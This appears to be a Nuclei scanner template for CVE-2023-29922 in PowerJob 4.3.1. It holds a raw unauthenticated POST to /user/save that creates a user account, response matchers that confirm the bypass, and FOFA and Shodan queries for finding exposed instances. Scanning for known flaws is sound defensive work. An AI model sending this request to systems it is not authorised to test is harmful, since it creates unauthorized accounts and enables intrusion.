http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"success":true'
    - '"data":null'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /user/save HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"username":"{{str}}","phone":"{{str}}","email":"{{str}}","webHook":"{{str}}"}

    '
id: CVE-2023-29922
info:
  author: Co5mos
  classification:
    cpe: cpe:2.3:a:powerjob:powerjob:4.3.1:*:*:*:*:*:*:*
    cve-id: CVE-2023-29922
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-1188
    epss-percentile: 0.99569
    epss-score: 0.90264
  description: 'PowerJob V4.3.1 is vulnerable to Incorrect Access Control via the
    create user/save interface.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    bypass authentication and gain unauthorized access to the application.

    '
  metadata:
    fofa-query:
    - app="PowerJob"
    - app="powerjob"
    - body="powerjob"
    max-request: 1
    product: powerjob
    shodan-query:
    - html:"PowerJob"
    - http.html:"powerjob"
    vendor: powerjob
    verified: true
  name: PowerJob V4.3.1 - Authentication Bypass
  reference:
  - https://github.com/PowerJob/PowerJob/issues/585
  - https://nvd.nist.gov/vuln/detail/CVE-2023-29922
  - https://github.com/CN016/Powerjob-CVE-2023-29922-
  - https://github.com/nomi-sec/PoC-in-GitHub
  - https://github.com/1820112015/CVE-2023-29923
  remediation: 'Apply the latest security patch or upgrade to a patched version of
    PowerJob V4.3.1.

    '
  severity: medium
  tags: cve,cve2023,auth-bypass,powerjob,vuln
variables:
  str: '{{rand_base(6)}}'
